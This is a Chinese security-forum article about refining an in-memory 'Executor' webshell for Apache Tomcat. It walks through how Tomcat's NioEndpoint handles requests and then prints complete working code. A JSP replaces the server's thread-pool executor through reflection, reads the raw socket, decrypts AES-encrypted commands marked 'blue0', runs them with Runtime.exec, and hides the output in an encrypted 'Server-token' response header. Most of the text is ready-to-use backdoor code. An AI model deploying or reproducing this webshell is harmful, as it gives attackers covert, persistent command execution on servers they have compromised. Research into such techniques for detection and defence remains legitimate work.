<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/11613)

> 先知社区，先知安全技术社区

**前言**  
在《Executor 内存马的实现》中我们通过修改 NioEndpoint 的 Executor 实现，成功完成了一个 Container 类型的内存马注入。  
但是上文中我提供的代码并不够完善，其中有一个比较明显的问题，内存马的回显需要经过我们多次 request 才能够实现，我们如何解决这个问题？  
**正文**  
**为什么会出现这种情况？**  
前文中我们提到，Tomcat 的整体架构可大致分为两块，一部分为用于处理 request 的 Connector，另一部分  
为具体实现处理逻辑的 Container。  
ps：前文中引用的图有问题。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220809214300-2f06db22-17e9-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220809214300-2f06db22-17e9-1.png)

由于处理逻辑过于复杂，为了节约时间，我按照自己的调试思路简单记录了一下：  
首先 NioEndpoint 会从 nioChannels 中取出一个名为 NioChannel 的对象：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220809214312-369d6bee-17e9-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220809214312-369d6bee-17e9-1.png)

然后它将会调用 poller 进行事件注册：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220809214319-3a7c2f34-17e9-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220809214319-3a7c2f34-17e9-1.png)

实现 register 的逻辑如下，其中个人认为比较重要的是 NioSocketWrapper 的封装，与 PollerEvent 的注册。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220809214324-3d674fc6-17e9-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220809214324-3d674fc6-17e9-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220809214329-406c2c14-17e9-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220809214329-406c2c14-17e9-1.png)

可以看到这个 NioSocketWrapper 是基于上文获取的 NioChannel 对象：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220809214334-43b7135c-17e9-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220809214334-43b7135c-17e9-1.png)

```
addEvent：
......

private void addEvent(NioEndpoint.PollerEvent event) {
    this.events.offer(event);
    if (this.wakeupCounter.incrementAndGet() == 0L) {
        this.selector.wakeup();
    }
}

......

public synchronized boolean offer(T t) {
    this.queue[this.insert++] = t;
    if (this.insert == this.size) {
        this.insert = 0;
    }

    if (this.insert == this.remove) {
        this.expand();
    }
    return true;
}

......


```

Event 添加完成后 Acceptor 调用 accept 方法

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220809214410-59298378-17e9-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220809214410-59298378-17e9-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220809214415-5bd6f876-17e9-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220809214415-5bd6f876-17e9-1.png)

通过 Poller 的 prosessKey 方法发送给 Executor 进行相关 execute 操作：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220809214419-5e8e7ef4-17e9-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220809214419-5e8e7ef4-17e9-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220809214424-610463e2-17e9-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220809214424-610463e2-17e9-1.png)

而前文中提到，我们的恶意代码就在重写的 execute 方法中：

```
@Override
        public void execute(Runnable command) {
//            System.out.println("123");

            String cmd = getRequest();
            if (cmd.length() > 1) {
                try {
                    Runtime rt = Runtime.getRuntime();
                    Process process = rt.exec(cmd);
                    java.io.InputStream in = process.getInputStream();

                    java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
                    java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
                    String s = "";
                    String tmp = "";
                    while ((tmp = stdInput.readLine()) != null) {
                        s += tmp;
                    }
                    if (s != "") {
                        byte[] res = s.getBytes(StandardCharsets.UTF_8);
                        getResponse(res);
                    }


                } catch (IOException e) {
                    e.printStackTrace();
                }
            }


            this.execute(command, 0L, TimeUnit.MILLISECONDS);
        }

    }


```

执行完毕后，SocketProcessor 对象会通过 process 方法将我们的 socketWrapper 送往真正进行 socket 处理的 processor 组件：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220809214441-6ba3a858-17e9-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220809214441-6ba3a858-17e9-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220809214445-6dc69da2-17e9-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220809214445-6dc69da2-17e9-1.png)

socket 处理：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220809214450-70982d02-17e9-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220809214450-70982d02-17e9-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220809214454-7348f9d2-17e9-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220809214454-7348f9d2-17e9-1.png)

最终的 read 在 fill() 方法中实现：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220809214459-764a0950-17e9-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220809214459-764a0950-17e9-1.png)

```
private boolean fill(boolean block) throws IOException {
    if (log.isDebugEnabled()) {
        log.debug("Before fill(): parsingHeader: [" + this.parsingHeader + "], parsingRequestLine: [" + this.parsingRequestLine + "], parsingRequestLinePhase: [" + this.parsingRequestLinePhase + "], parsingRequestLineStart: [" + this.parsingRequestLineStart + "], byteBuffer.position(): [" + this.byteBuffer.position() + "], byteBuffer.limit(): [" + this.byteBuffer.limit() + "], end: [" + this.end + "]");
    }

    if (this.parsingHeader) {
        if (this.byteBuffer.limit() >= this.headerBufferSize) {
            if (this.parsingRequestLine) {
                this.request.protocol().setString("HTTP/1.1");
            }

            throw new IllegalArgumentException(sm.getString("iib.requestheadertoolarge.error"));
        }
    } else {
        this.byteBuffer.limit(this.end).position(this.end);
    }

    int nRead = true;
    this.byteBuffer.mark();

    int nRead;
    try {
        if (this.byteBuffer.position() < this.byteBuffer.limit()) {
            this.byteBuffer.position(this.byteBuffer.limit());
        }

        this.byteBuffer.limit(this.byteBuffer.capacity());
        nRead = this.wrapper.read(block, this.byteBuffer);
    } finally {
        this.byteBuffer.limit(this.byteBuffer.position()).reset();
    }

    if (log.isDebugEnabled()) {
        log.debug("Received [" + new String(this.byteBuffer.array(), this.byteBuffer.position(), this.byteBuffer.remaining(), StandardCharsets.ISO_8859_1) + "]");
    }

    if (nRead > 0) {
        return true;
    } else if (nRead == -1) {
        throw new EOFException(sm.getString("iib.eof.error"));
    } else {
        return false;
    }
}


```

调用栈如下：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220809214519-820adf80-17e9-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220809214519-820adf80-17e9-1.png)

最终通过 Socket 读取到的最原始的 request 数据被放入各实例的缓存 buffer 中：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220809214547-930177e0-17e9-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220809214547-930177e0-17e9-1.png)

最后调用 invoke 方法交给 Container 处理：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220809214554-969e0d82-17e9-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220809214554-969e0d82-17e9-1.png)

so，观察一下前文的代码，我们执行的位置是在 Executor，这个时候 Socket 流中的数据还没有被 read，通过线程遍历获取到的 request 其实是前一次（或者前几次，跟线程数有关）的缓存数据，所以获取命令需要我们多次进行 request 请求。

艰难的解决之路  
在写这个 part 之前，其实我并不知晓 socket 的核心处理点在何处。不得不说偏执是快速解决问题的最大阻碍，通过类似如下的调试代码，我逐一比对 buffer 部分的变化情况：

```
byte[] bytes = new byte[10000];
ByteBuffer buf = ByteBuffer.wrap(bytes);
LinkedList linkedList = (LinkedList) getField(getField(getField((Poller)threads[5].target,"selector"),"kqueueWrapper"),"updateList");
for(Object obj : linkedList){
    SelectionKey[] selectionKeys =(SelectionKey[]) getField(getField(obj,"channel"),"keys");
    for (Object tmp :selectionKeys){
        NioEndpoint.NioSocketWrapper nioSocketWrapper = (NioEndpoint.NioSocketWrapper) getField(tmp,"attachment");
        nioSocketWrapper.read(false,buf);
    }
}
//new String(buf.array(),"UTF-8");


```

最终才发现，socket 的处理点在 Executor 的处理之后而非之前。  
从 buffer 中获取当次 request 的想法应该是幻灭了，那么从 socket 下手又如何呢？

**Find Real Socket**  
之前我固执的认为，Acceptor 组件应该为 Container 处理逻辑的核心，理应重点从其中寻找想要的对象。  
但经过测试发现，从 Accpetor 中获取的 Socket 无一例外都已处于 closed 状态，无法重新 read（即使通过反射修改其状态，EndPoint 组件也会立即抛出异常。）  
在重新审视 Tomcat 的处理逻辑后，最终在 Poller 中发现了我们的 Real NioSocketWrapper 对象：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220809214628-aae95c42-17e9-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220809214628-aae95c42-17e9-1.png)

通过其 read 方法可成功获取当次的 request 请求：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220809214716-c79db54a-17e9-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220809214716-c79db54a-17e9-1.png)

但这会导致一个问题，由于在 Processor 组件对 socket 处理之前我们就已进行过一次 read，后续的处理逻辑势必无法再次获取已读取过的 request 数据：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220809214738-d49f54c4-17e9-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220809214738-d49f54c4-17e9-1.png)

这该如何解决？  
在翻看代码的过程中，我发现 NioSocketWrapper 父类 SocketWrapperBase 中，有一个方法名为 unRead：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220809214745-d8f174d0-17e9-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220809214745-d8f174d0-17e9-1.png)

通过查找资料后发现与猜想中的作用大致相同：将已读取过的 read 数据重新放回 socket。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220809214752-dd30b092-17e9-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220809214752-dd30b092-17e9-1.png)

经过测试该方法可行，于是最终实现的代码为：

```
public String getRequest2(){
    Thread[] threads = (Thread[]) ((Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads"));

    for (Thread thread : threads) {
        if (thread != null) {
            String threadName = thread.getName();
            if (threadName.contains("Poller")) {
                Object target = getField(thread, "target");
                if (target instanceof Runnable) {
                    try {
                        byte[] bytes = new byte[8192];//Tomcat的NioSocketWrapper中默认buffer大小
                        ByteBuffer buf = ByteBuffer.wrap(bytes);
                        try {
                            LinkedList linkedList = (LinkedList) getField(getField(getField(target, "selector"), "kqueueWrapper"), "updateList");
                            for (Object obj : linkedList) {
                                try {
                                    SelectionKey[] selectionKeys = (SelectionKey[]) getField(getField(obj, "channel"), "keys");

                                    for (Object tmp : selectionKeys) {
                                        try {
                                            NioEndpoint.NioSocketWrapper nioSocketWrapper = (NioEndpoint.NioSocketWrapper) getField(tmp, "attachment");
                                            try {
                                                nioSocketWrapper.read(false, buf);
                                                String a = new String(buf.array(), "UTF-8");
                                                if (a.indexOf("blue0") > -1) {
                                                    System.out.println(a.indexOf("blue0"));
                                                    System.out.println(a.indexOf("\r", a.indexOf("blue0")));
                                                    String b = a.substring(a.indexOf("blue0") + "blue0".length() + 2, a.indexOf("\r", a.indexOf("blue0")));
                                                    b = decode(DEFAULT_SECRET_KEY, b);
                                                    buf.position(0);
                                                    nioSocketWrapper.unRead(buf);
//                                                    System.out.println(b);
//                                                    System.out.println(new String(buf.array(), "UTF-8"));
                                                    return b;
                                                }
                                                else{
                                                    buf.position(0);
                                                    nioSocketWrapper.unRead(buf);
                                                    continue;
                                                }
                                            } catch (Exception e) {
                                                nioSocketWrapper.unRead(buf);
                                            }
                                        } catch (Exception e) {
                                            continue;
                                        }
                                    }
                                } catch (Exception e) {
                                    continue;
                                }
                            }
                        } catch (Exception var11) {
                            System.out.println(var11);
                            continue;
                        }

                    } catch (Exception ignored) {
                    }
                }

            }
            if (threadName.contains("exec")) {
                return new String();
            } else {
                continue;
            }
        }
    }

    return new String();
}


```

上述代码中有一处 buf.position(0) 的操作，其实是跟 ByteBuffer 的本身结构与 read 的实现逻辑有关，具体就不展开了，感兴趣的师傅可以跟一下过程。  
以 url 中结尾的数字来测试实效性：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220809214821-ee3fc7ba-17e9-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220809214821-ee3fc7ba-17e9-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220809214835-f6e548c2-17e9-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220809214835-f6e548c2-17e9-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220809214842-faff1bcc-17e9-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220809214842-faff1bcc-17e9-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220809214847-fe34489e-17e9-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220809214847-fe34489e-17e9-1.png)

**jsp2.0**  
另外由于 Tomcat 在实现默认线程池与自定义线程池时所用的 Executor 有些许差别，已在代码中进行修改。

```
<%@ page import="org.apache.tomcat.util.net.NioEndpoint" %>
<%@ page import="org.apache.tomcat.util.threads.ThreadPoolExecutor" %>
<%@ page import="java.util.concurrent.TimeUnit" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.util.concurrent.BlockingQueue" %>
<%@ page import="java.util.concurrent.ThreadFactory" %>
<%@ page import="java.nio.ByteBuffer" %>
<%@ page import="java.util.ArrayList" %>
<%@ page import="org.apache.coyote.RequestInfo" %>
<%@ page import="org.apache.coyote.Response" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.nio.charset.StandardCharsets" %>
<%@ page import="com.example.java_backdoor.Executor_ms" %>
<%@ page import="org.apache.catalina.core.StandardThreadExecutor" %>
<%@ page import="java.util.LinkedList" %>
<%@ page import="java.nio.channels.SelectionKey" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>


<%!
    public static final String DEFAULT_SECRET_KEY = "blueblueblueblue";
    private static final String AES = "AES";
    private static final byte[] KEY_VI = "blueblueblueblue".getBytes();
    private static final String CIPHER_ALGORITHM = "AES/CBC/PKCS5Padding";
    private static java.util.Base64.Encoder base64Encoder = java.util.Base64.getEncoder();
    private static java.util.Base64.Decoder base64Decoder = java.util.Base64.getDecoder();

    public static String decode(String key, String content) {
        try {
            javax.crypto.SecretKey secretKey = new javax.crypto.spec.SecretKeySpec(key.getBytes(), AES);
            javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance(CIPHER_ALGORITHM);
            cipher.init(javax.crypto.Cipher.DECRYPT_MODE, secretKey, new javax.crypto.spec.IvParameterSpec(KEY_VI));

            byte[] byteContent = base64Decoder.decode(content);
            byte[] byteDecode = cipher.doFinal(byteContent);
            return new String(byteDecode, java.nio.charset.StandardCharsets.UTF_8);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public static String encode(String key, String content) {
        try {
            javax.crypto.SecretKey secretKey = new javax.crypto.spec.SecretKeySpec(key.getBytes(), AES);
            javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance(CIPHER_ALGORITHM);
            cipher.init(javax.crypto.Cipher.ENCRYPT_MODE, secretKey, new javax.crypto.spec.IvParameterSpec(KEY_VI));
            byte[] byteEncode = content.getBytes(java.nio.charset.StandardCharsets.UTF_8);
            byte[] byteAES = cipher.doFinal(byteEncode);
            return base64Encoder.encodeToString(byteAES);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }


    public Object getField(Object object, String fieldName) {
        Field declaredField;
        Class clazz = object.getClass();
        while (clazz != Object.class) {
            try {

                declaredField = clazz.getDeclaredField(fieldName);
                declaredField.setAccessible(true);
                return declaredField.get(object);
            } catch (NoSuchFieldException | IllegalAccessException e) {
            }
            clazz = clazz.getSuperclass();
        }
        return null;
    }


    public Object getStandardService() {
        Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), "threads");
        for (Thread thread : threads) {
            if (thread == null) {
                continue;
            }
            if ((thread.getName().contains("Acceptor")) && (thread.getName().contains("http"))) {
                Object target = this.getField(thread, "target");
                Object jioEndPoint = null;
                try {
                    jioEndPoint = getField(target, "this$0");
                } catch (Exception e) {
                }
                if (jioEndPoint == null) {
                    try {
                        jioEndPoint = getField(target, "endpoint");
                    } catch (Exception e) {
                        new Object();
                    }
                } else {
                    return jioEndPoint;
                }
            }

        }
        return new Object();
    }

    public class threadexcutor extends ThreadPoolExecutor {

        public threadexcutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue<Runnable> workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler) {
            super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler);
        }

        public String getRequest() {
            try {
                Thread[] threads = (Thread[]) ((Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads"));

                for (Thread thread : threads) {
                    if (thread != null) {
                        String threadName = thread.getName();
                        if (!threadName.contains("exec") && threadName.contains("Acceptor")) {
                            Object target = getField(thread, "target");
                            if (target instanceof Runnable) {
                                try {

                                    Object[] objects = (Object[]) getField(getField(getField(target, "this$0"), "nioChannels"), "stack");

                                    ByteBuffer heapByteBuffer = (ByteBuffer) getField(getField(objects[0], "appReadBufHandler"), "byteBuffer");
                                    String a = new String(heapByteBuffer.array(), "UTF-8");

                                    if (a.indexOf("blue0") > -1) {
                                        System.out.println(a.indexOf("blue0"));
                                        System.out.println(a.indexOf("\r", a.indexOf("blue0")) - 1);
                                        String b = a.substring(a.indexOf("blue0") + "blue0".length() + 1, a.indexOf("\r", a.indexOf("blue0")) - 1);

                                        b = decode(DEFAULT_SECRET_KEY, b);

                                        return b;
                                    }

                                } catch (Exception var11) {
                                    System.out.println(var11);
                                    continue;
                                }


                            }
                        }
                    }
                }
            } catch (Exception ignored) {
            }
            return new String();
        }

        public String getRequest2(){
            Thread[] threads = (Thread[]) ((Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads"));

            for (Thread thread : threads) {
                if (thread != null) {
                    String threadName = thread.getName();
                    if (threadName.contains("Poller")) {
                        Object target = getField(thread, "target");
                        if (target instanceof Runnable) {
                            try {
                                byte[] bytes = new byte[8192];
                                ByteBuffer buf = ByteBuffer.wrap(bytes);
                                try {
                                    LinkedList linkedList = (LinkedList) getField(getField(getField(target, "selector"), "kqueueWrapper"), "updateList");
                                    for (Object obj : linkedList) {
                                        try {
                                            SelectionKey[] selectionKeys = (SelectionKey[]) getField(getField(obj, "channel"), "keys");

                                            for (Object tmp : selectionKeys) {
                                                try {
                                                    NioEndpoint.NioSocketWrapper nioSocketWrapper = (NioEndpoint.NioSocketWrapper) getField(tmp, "attachment");
                                                    try {
                                                        nioSocketWrapper.read(false, buf);
                                                        String a = new String(buf.array(), "UTF-8");
                                                        if (a.indexOf("blue0") > -1) {
                                                            System.out.println(a.indexOf("blue0"));
                                                            System.out.println(a.indexOf("\r", a.indexOf("blue0")));
                                                            String b = a.substring(a.indexOf("blue0") + "blue0".length() + 2, a.indexOf("\r", a.indexOf("blue0")));
                                                            b = decode(DEFAULT_SECRET_KEY, b);
                                                            buf.position(0);
                                                            nioSocketWrapper.unRead(buf);
                                                            System.out.println(b);
                                                            System.out.println(new String(buf.array(), "UTF-8"));
                                                            return b;
                                                        }
                                                        else{
                                                            buf.position(0);
                                                            nioSocketWrapper.unRead(buf);
                                                            continue;
                                                        }
                                                    } catch (Exception e) {
                                                        nioSocketWrapper.unRead(buf);
                                                    }
                                                } catch (Exception e) {
                                                    continue;
                                                }
                                            }
                                        } catch (Exception e) {
                                            continue;
                                        }
                                    }
                                } catch (Exception var11) {
                                    System.out.println(var11);
                                    continue;
                                }

                            } catch (Exception ignored) {
                            }
                        }

                    }
                    if (threadName.contains("exec")) {
                        return new String();
                    } else {
                        continue;
                    }
                }
            }

            return new String();
        }


        public void getResponse(byte[] res) {
            try {
                Thread[] threads = (Thread[]) ((Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads"));

                for (Thread thread : threads) {
                    if (thread != null) {
                        String threadName = thread.getName();
                        if (!threadName.contains("exec") && threadName.contains("Acceptor")) {
                            Object target = getField(thread, "target");
                            if (target instanceof Runnable) {
                                try {
                                    ArrayList objects = (ArrayList) getField(getField(getField(getField(target, "this$0"), "handler"), "global"), "processors");
                                    for (Object tmp_object : objects) {
                                        RequestInfo request = (RequestInfo) tmp_object;
                                        Response response = (Response) getField(getField(request, "req"), "response");
                                        response.addHeader("Server-token", encode(DEFAULT_SECRET_KEY,new String(res, "UTF-8")));

                                    }
                                } catch (Exception var11) {
                                    continue;
                                }

                            }
                        }
                    }
                }
            } catch (Exception ignored) {
            }
        }


        @Override
        public void execute(Runnable command) {
//            System.out.println("123");

            String cmd = getRequest2();
            if (cmd.length() > 1) {
                try {
                    Runtime rt = Runtime.getRuntime();
                    Process process = rt.exec(cmd);
                    java.io.InputStream in = process.getInputStream();

                    java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
                    java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
                    String s = "";
                    String tmp = "";
                    while ((tmp = stdInput.readLine()) != null) {
                        s += tmp;
                    }
                    if (s != "") {
                        byte[] res = s.getBytes(StandardCharsets.UTF_8);
                        getResponse(res);
                    }


                } catch (IOException e) {
                    e.printStackTrace();
                }
            }


            this.execute(command, 0L, TimeUnit.MILLISECONDS);
        }

    }



%>

<%


    NioEndpoint nioEndpoint = (NioEndpoint) getStandardService();
    try {
        ThreadPoolExecutor exec = (ThreadPoolExecutor) getField(nioEndpoint, "executor");
        Executor_ms.threadexecutor exe = new Executor_ms.threadexecutor(exec.getCorePoolSize(), exec.getMaximumPoolSize(), exec.getKeepAliveTime(TimeUnit.MILLISECONDS), TimeUnit.MILLISECONDS, exec.getQueue(), exec.getThreadFactory(), exec.getRejectedExecutionHandler());
        nioEndpoint.setExecutor(exe);
    }catch (ClassCastException e){
        StandardThreadExecutor standardexec = (StandardThreadExecutor) getField(nioEndpoint, "executor");
        ThreadPoolExecutor exec = (ThreadPoolExecutor) getField(standardexec, "executor");
        Executor_ms.threadexecutor exe = new Executor_ms.threadexecutor(exec.getCorePoolSize(), exec.getMaximumPoolSize(), exec.getKeepAliveTime(TimeUnit.MILLISECONDS), TimeUnit.MILLISECONDS, exec.getQueue(), exec.getThreadFactory(), exec.getRejectedExecutionHandler());
        nioEndpoint.setExecutor(exe);
    }

%>


public String getRequest2(){
    Thread[] threads = (Thread[]) ((Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads"));

    for (Thread thread : threads) {
        if (thread != null) {
            String threadName = thread.getName();
            if (threadName.contains("Poller")) {
                Object target = getField(thread, "target");
                if (target instanceof Runnable) {
                    try {
                        byte[] bytes = new byte[8192];
                        ByteBuffer buf = ByteBuffer.wrap(bytes);
                        try {
                            LinkedList linkedList = (LinkedList) getField(getField(getField(target, "selector"), "kqueueWrapper"), "updateList");
                            for (Object obj : linkedList) {
                                try {
                                    SelectionKey[] selectionKeys = (SelectionKey[]) getField(getField(obj, "channel"), "keys");

                                    for (Object tmp : selectionKeys) {
                                        try {
                                            NioEndpoint.NioSocketWrapper nioSocketWrapper = (NioEndpoint.NioSocketWrapper) getField(tmp, "attachment");
                                            try {
                                                nioSocketWrapper.read(false, buf);
                                                String a = new String(buf.array(), "UTF-8");
                                                if (a.indexOf("blue0") > -1) {
                                                    System.out.println(a.indexOf("blue0"));
                                                    System.out.println(a.indexOf("\r", a.indexOf("blue0")));
                                                    String b = a.substring(a.indexOf("blue0") + "blue0".length() + 2, a.indexOf("\r", a.indexOf("blue0")));
                                                    b = decode(DEFAULT_SECRET_KEY, b);
                                                    buf.position(0);
                                                    nioSocketWrapper.unRead(buf);
                                                    System.out.println(b);
                                                    System.out.println(new String(buf.array(), "UTF-8"));
                                                    return b;
                                                }
                                                else{
                                                    buf.position(0);
                                                    nioSocketWrapper.unRead(buf);
                                                    continue;
                                                }
                                            } catch (Exception e) {
                                                buf.position(0);
                                                nioSocketWrapper.unRead(buf);
                                            }
                                        } catch (NoClassDefFoundError e) {
                                            KeyAttachment keyAttachment = (KeyAttachment) getField(tmp, "attachment");
                                            NioChannel nioChannel = keyAttachment.getSocket();
                                            try {
                                                nioChannel.read(buf);
                                                String a = new String(buf.array(), "UTF-8");
                                                if (a.indexOf("blue0") > -1) {
                                                    System.out.println(a.indexOf("blue0"));
                                                    System.out.println(a.indexOf("\r", a.indexOf("blue0")));
                                                    String b = a.substring(a.indexOf("blue0") + "blue0".length() + 2, a.indexOf("\r", a.indexOf("blue0")));
                                                    b = decode(DEFAULT_SECRET_KEY, b);
                                                    buf.position(0);
                                                    nioChannel.getBufHandler().getReadBuffer().put(buf);
                                                    System.out.println(b);
                                                    System.out.println(new String(buf.array(), "UTF-8"));
                                                    return b;
                                                }
                                                else{
                                                    buf.position(0);
                                                    nioChannel.getBufHandler().getReadBuffer().put(buf);
                                                    continue;
                                                }
                                            } catch (Exception b) {
                                                buf.position(0);
                                                nioChannel.getBufHandler().getReadBuffer().put(buf);
                                            }

                                            continue;
                                        }
                                    }
                                } catch (Exception e) {
                                    continue;
                                }
                            }
                        } catch (Exception var11) {
                            System.out.println(var11);
                            continue;
                        }

                    } catch (Exception ignored) {
                    }
                }

            }
            if (threadName.contains("exec")) {
                return new String();
            } else {
                continue;
            }
        }
    }

    return new String();
}


```

**后记**  
仍请忽略我拙劣的 coding 能力，代码中仍存在一些问题（比如回显 size 过大导致的 response header 溢出错误。）  
ps：更正一个错误，Tomcat8.0 以前版本在处理 io 时直接使用 NioChannel.read(buf) 作为获取数据流的方法，而不同于 8.5 版本使用封装类 SocketWrapperBase，故其中的处理逻辑不支持 read() 后将 buf 再重新放回原有的 socket（这个说法其实并不准确，其实是 tomcat 在 SocketWrapperBase 中手动实现了一个 transform 方法将已读出的 read 数据放入后续需要进行处理的 read buffer 中），所以对于 8.0 以前的版本文中所提到的截获 socket 的方法可能并不适用，还是得使用缓存实现。